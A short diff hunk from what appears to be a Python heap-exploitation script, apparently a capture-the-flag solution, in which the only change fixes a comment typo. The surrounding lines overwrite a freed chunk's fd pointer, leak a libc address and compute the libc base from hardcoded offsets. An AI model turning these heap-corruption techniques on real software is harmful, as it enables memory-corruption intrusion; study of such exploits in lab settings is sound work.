@@ -112,7 +112,7 @@ if __name__ == "__main__":
     new_note('C'*8) # overwrite fd pointer and still we have bk pointer to <main_arena>
     
     leaked_libc = leak_libc() 
-    libc_base = leaked_libc - (0x7f8f01ab8b78 - 0x7f8f016f4000) # ugly, need refactoring.
+    libc_base = leaked_libc - (0x7f8f01ab8b78 - 0x7f8f016f4000) # ugly, needs refactoring.
 
     delete_note(0)
     delete_note(1)
